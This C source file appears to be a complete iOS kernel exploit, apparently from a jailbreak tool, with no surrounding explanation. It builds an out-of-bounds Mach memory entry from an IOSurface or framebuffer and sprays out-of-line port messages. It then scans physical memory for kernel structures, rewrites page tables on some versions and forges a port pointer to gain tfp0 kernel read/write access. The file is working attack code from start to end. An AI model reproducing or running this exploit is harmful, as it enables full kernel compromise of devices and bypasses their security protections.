#include "util.h"
#include "memory.h"
#include "oob_entry.h"

kinfo_t *kinfo = NULL;

void print_log(const char *fmt, ...) {
    static bool log_opened = false;
    if (!log_opened) {
        openlog("oob_entry", LOG_PID | LOG_CONS, LOG_USER);
        log_opened = true;
    }

    char buf[1024];
    va_list va;
    va_start(va, fmt);
    vsnprintf(buf, sizeof(buf), fmt, va);
    va_end(va);

#ifndef UNTETHER
    syslog(LOG_ERR, "%s", buf);
    fprintf(stderr, "%s", buf);
    fflush(stderr);
#else
    static int console_fd = -1;
    if (console_fd < 0) {
        console_fd = open("/dev/console", O_WRONLY | O_NOCTTY);
    }

    if (console_fd >= 0) {
        write(console_fd, buf, strlen(buf));
        if (buf[strlen(buf) - 1] != '\n') {
            write(console_fd, "\n", 1);
        }
        fsync(console_fd);
    }
#endif
}

int create_oob_entry(void) {
    uint64_t oob_size = 0xffffffffffffc000;
    uint64_t oob_offset = 0xffffffff00008000;
    vm_prot_t prot = VM_PROT_READ | VM_PROT_WRITE;
    mach_port_t task = mach_task_self();
    void *surface = NULL;
    
    if (kinfo->version[0] <= 7) {
        const char *list[] = {"AppleCLCD", "AppleM2CLCD", "AppleH1CLCD", "AppleMobileCLCD", NULL};
        mach_port_t service = MACH_PORT_NULL;
        mach_port_t client = MACH_PORT_NULL;

        for (uint32_t i = 0; list[i]; i++) {
            service = IOServiceGetMatchingService(0, IOServiceMatching(list[i]));
            if (MACH_PORT_VALID(service)) break;
        }

        if (!MACH_PORT_VALID(service)) return -1;
        IOMobileFramebufferOpen(service, mach_task_self(), 0, &client);

        if (!MACH_PORT_VALID(client)) return -1;
        IOMobileFramebufferGetLayerDefaultSurface(client, 0, &surface);
        if (surface == NULL) return -1;
    } else {
        CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
        CFDictionarySetValue(dict, CFSTR("IOSurfacePixelFormat"), CFNUM((int)'ARGB'));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceWidth"), CFNUM(32));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceHeight"), CFNUM(32));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceBufferTileMode"), kCFBooleanFalse);
        CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerRow"), CFNUM(128));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerElement"), CFNUM(4));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), CFNUM(0x20000));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
        
        surface = IOSurfaceCreate(dict);
        CFRelease(dict);
        if (surface == NULL) return -1;
    }
    
    memory_object_size_t entry_size = 0x20000;
    memory_object_offset_t entry_base = (memory_object_offset_t)IOSurfaceGetBaseAddress(surface);
    if (kinfo->version[0] >= 8) memset((void *)entry_base, 0x41, entry_size);

    if (mach_make_memory_entry_64(task, &entry_size, entry_base, prot, &kinfo->main_entry, 0) != 0) return -1;      
    if (mach_make_memory_entry_64(task, &oob_size, oob_offset, prot, &kinfo->oob_entry, kinfo->main_entry) != 0) return -1;
    CFRelease(surface);
    return 0;
}

int create_ool_helper(mach_port_t *port, uint32_t *addr, int ool_count) {
    mach_port_t remote = create_mach_port();
    mach_port_t task = mach_task_self();
    mach_port_t host = mach_host_self();

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = ool_count;
    mach_port_set_attributes(task, remote, 1, (mach_port_info_t)&limits, MACH_PORT_LIMITS_INFO_COUNT);

    mach_port_t *port_list = calloc(1, 1024 * 0x4);
    for (uint32_t i = 0; i < 1024; i++) port_list[i] = MACH_PORT_DEAD;
    port_list[1] = MACH_PORT_NULL;
    port_list[8] = MACH_PORT_NULL;
    port_list[3] = task;
    port_list[4] = host;
    port_list[5] = task;
    port_list[6] = host;

    ool_msg_t *msg = calloc(1, sizeof(ool_msg_t));
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(ool_msg_t);
    msg->hdr.msgh_remote_port = remote;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x13374141;
    msg->body.msgh_descriptor_count = 1;
    msg->ool_ports.address = port_list;
    msg->ool_ports.count = 1024;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    for (uint32_t i = 0; i < ool_count; i++) {
        mach_msg(&msg->hdr, MACH_SEND_MSG, msg->hdr.msgh_size, 0, 0, 0, 0);
    }
    
    uint32_t map_current = kinfo->mem_base;
    uint32_t map_end = map_current + kinfo->mem_size;
    uint32_t map_size = kinfo->mem_size / 0x100;
    uint8_t *mapped = NULL;
    free(msg);

    for (; map_current < map_end; map_current+=map_size) {
        mapped = map_data(map_current, map_size, VM_PROT_READ);
        if (mapped == NULL) break;
        
        for (uint32_t i = 0x0; i < map_size; i+=0x1000) {
            uint32_t *ports = (uint32_t *)(mapped + i);
            if (ports[0] == -1 && ports[1] == 0 && ports[2] == -1 &&
                ports[7] == -1 && ports[8] == 0 && ports[9] == -1 &&
                ports[3] == ports[5] && ports[4] == ports[6] && ports[3] != ports[4]) {
                
                *addr = map_current + i;
                *port = remote;
                break;
            }
        }
        
        unmap_data(mapped, map_size);
        if (*addr != 0) break;
    }

    if (*addr == 0) mach_port_deallocate(task, remote);
    return (*addr != 0) ? 0 : -1;
}

int find_kernel_port(void) {
    uint32_t page_va = kinfo->host_port_addr & ~0xfff;
    uint32_t page_pa = kvtophys(page_va);
    if (page_va == 0) return -1;

    uint8_t *mapped = map_data(page_pa, 0x1000, VM_PROT_READ);
    uint32_t task_bits = IO_BITS_ACTIVE | IKOT_TASK;
    uint32_t offset = (kinfo->version[0] <= 8) ? 0x1c : 0x2c;
     
    for (uint32_t i = 0; i < 0x1000; i+=0x4) {
        if (*(uint32_t *)(mapped + i) == task_bits && (*(uint32_t *)(mapped + i + offset) & ~0xfff) == page_va) {
            if (kinfo->version[0] >= 4) {
                kinfo->kern_port_addr = (kinfo->host_port_addr & ~0xfff) + i;
                kinfo->kern_task_addr = *(uint32_t *)(mapped + i + koffsetof(ipc_port, ip_kobject));
            } else {
                kinfo->kern_port_addr = (kinfo->host_port_addr & ~0xfff) + i - 0x4;
                kinfo->kern_task_addr = *(uint32_t *)(mapped + i - 0x4 + koffsetof(ipc_port, ip_kobject));
            }
            break;
        }
    }

    unmap_data(mapped, 0x1000);
    return (kinfo->kern_port_addr != 0) ? 0 : -1;
}

int remap_kernel_task(void) {
    uint32_t kern_task_pa = kvtophys(kinfo->kern_task_addr);
    uint32_t kern_port_pa = kvtophys(kinfo->kern_port_addr);
    if (kern_task_pa == 0 || kern_port_pa == 0) return -1;

    uint32_t remap_entry = kinfo->mapping_base + 0x40000;
    uint32_t remap_page_pa = kern_task_pa & ~0xfff;
    uint32_t remap_page_va = 0xdead0000;
    uint32_t remap_va = 0xdead0000 + (kinfo->kern_task_addr & 0xfff);

    uint32_t l1_index = (remap_page_va >> 20) & 0xfff;
    uint32_t l1_entry = kinfo->kern_tte_phys + (l1_index * 4);
    uint32_t l2_index = (remap_page_va >> 12) & 0xff;
    uint32_t l2_entry = remap_entry + (l2_index * 4);

    physwrite32(l2_entry, (remap_page_pa & 0xfffff000) | (3 << 4) | 0x2);
    physwrite32(l1_entry, (remap_entry & 0xfffffc00) | 0x1);
    physwrite32(kern_port_pa + koffsetof(ipc_port, ip_kobject), remap_va);

    mem_barrier();
    return 0;
}

int run_exploit(int ool_count) {
    uint64_t timer = timer_start();
    kinfo = calloc(1, sizeof(kinfo_t));
    int status = -1;

    struct rlimit rlim = {0};
    rlim.rlim_cur = RLIM_INFINITY;
    rlim.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_AS, &rlim);
    setrlimit(RLIMIT_DATA, &rlim);

    if (init_io() != 0) goto done;
    if (init_offsets() != 0) goto done;
    print_log("[*] version: %u.%u.%u\n", kinfo->version[0], kinfo->version[1], kinfo->version[2]);
    
    if (create_oob_entry() != 0) goto done;
    print_log("[*] main_entry: 0x%x\n", kinfo->main_entry);
    print_log("[*] oob_entry: 0x%x\n", kinfo->oob_entry);
    uint8_t *mapped = map_relative_data(0, 0x10000000, VM_PROT_READ);
    for (uint32_t i = 0; i < 0x10000000; i+=0x1000) {
        if (*(uint32_t *)(mapped + i) == MH_MAGIC && *(uint32_t *)(mapped + i + 0xc) == MH_EXECUTE) {
            kinfo->mapping_base = kinfo->kernel_phys_base - i;
            kinfo->kernel_base = *(uint32_t *)(mapped + i + 0x34);
            if (kinfo->version[0] >= 6) {
                kinfo->kernel_slide = kinfo->kernel_base - kinfo->kernel_phys_base;
            }
            break;
        }
    }

    unmap_data(mapped, 0x10000000);
    if (kinfo->mapping_base == 0) goto done;
    print_log("[*] mapping_base: 0x%x\n", kinfo->mapping_base);
    print_log("[*] kernel_base: 0x%x\n", kinfo->kernel_base);
    print_log("[*] kernel_slide: 0x%x\n", kinfo->kernel_slide);

    mach_port_t ool_port = MACH_PORT_NULL;
    uint32_t ool_addr = 0;
    if (create_ool_helper(&ool_port, &ool_addr, ool_count) != 0) goto done;
    print_log("[*] ool_port: 0x%x\n", ool_port);
    print_log("[*] ool_addr: 0x%x\n", ool_addr);
    
    kinfo->self_port_addr = physread32(ool_addr + 0xc);
    kinfo->host_port_addr = physread32(ool_addr + 0x10);
    print_log("[*] self_port_addr: 0x%x\n", kinfo->self_port_addr);
    print_log("[*] host_port_addr: 0x%x\n", kinfo->host_port_addr);

    if (find_kernel_port() != 0) goto done;
    if (kinfo->version[0] == 10 && kinfo->version[1] == 3) {
        if (remap_kernel_task() != 0) goto done;
    }

    print_log("[*] kern_port_addr: 0x%x\n", kinfo->kern_port_addr);
    physwrite32(ool_addr + 0xc, kinfo->kern_port_addr);
    usleep(10000);

    ool_msg_t *msg = calloc(1, 0x1000);
    for (uint32_t i = 0; i < ool_count; i++) {
        bzero(msg, 0x1000);
        mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, ool_port, 0, 0);

        mach_port_t *received = msg->ool_ports.address;
        if (received != NULL && received[3] != mach_task_self()) {
            kinfo->tfp0 = received[3];
            break;
        }
    }

    mach_port_deallocate(mach_task_self(), ool_port);
    free(msg);
    if (!MACH_PORT_VALID(kinfo->tfp0)) goto done;

    if (kinfo->version[0] >= 5) {
        natural_t type = 0;
        mach_vm_address_t addr = 0;
        pid_t pid = -1;

        mach_port_kobject(mach_task_self(), kinfo->tfp0, &type, &addr);
        pid_for_task(kinfo->tfp0, &pid);
        if (type != IKOT_TASK || pid != 0) goto done;
    }

    print_log("[*] tfp0: 0x%x\n", kinfo->tfp0);
    uint32_t test_alloc = kalloc(0x1000);
    print_log("[*] test_alloc: 0x%x\n", test_alloc);
    if (test_alloc == 0) goto done;
    
    kwrite32(test_alloc, 0x41414141);
    uint32_t test_read = kread32(test_alloc);
    print_log("[*] test_read: 0x%x\n", test_read);
    if (test_read != 0x41414141) goto done;
    
    if (kinfo->kern_task_addr == 0) kinfo->kern_task_addr = kread32(kinfo->kern_port_addr + koffsetof(ipc_port, ip_kobject));
    kinfo->kern_proc_addr = kread32(kinfo->kern_task_addr + koffsetof(task, bsd_info));
    kinfo->self_task_addr = kread32(kinfo->self_port_addr + koffsetof(ipc_port, ip_kobject));
    kinfo->self_proc_addr = kread32(kinfo->self_task_addr + koffsetof(task, bsd_info));

    print_log("[*] kern_task_addr: 0x%x\n", kinfo->kern_task_addr);
    print_log("[*] kern_proc_addr: 0x%x\n", kinfo->kern_proc_addr);
    print_log("[*] self_task_addr: 0x%x\n", kinfo->self_task_addr);
    print_log("[*] self_proc_addr: 0x%x\n", kinfo->self_port_addr);
    print_log("[*] kern_port_addr: 0x%x\n", kinfo->kern_port_addr);

    kwrite32(kinfo->kern_port_addr + koffsetof(ipc_port, ip_references), 0x414141);
    kwrite32(kinfo->kern_task_addr + koffsetof(task, ref_count), 0x424242);
    print_log("[*] done in %llu ms\n", timer_end(timer));
    status = 0;

done:
    if (status == 0) return 0;
    if (kinfo != NULL) {
        if (MACH_PORT_VALID(kinfo->oob_entry)) mach_port_deallocate(mach_task_self(), kinfo->oob_entry);
        if (MACH_PORT_VALID(kinfo->main_entry)) mach_port_deallocate(mach_task_self(), kinfo->main_entry);
        if (MACH_PORT_VALID(kinfo->tfp0)) mach_port_deallocate(mach_task_self(), kinfo->tfp0);
        free(kinfo);
        kinfo = NULL;
    }
    
    print_log("[-] exploit failed\n");
    return -1;
}
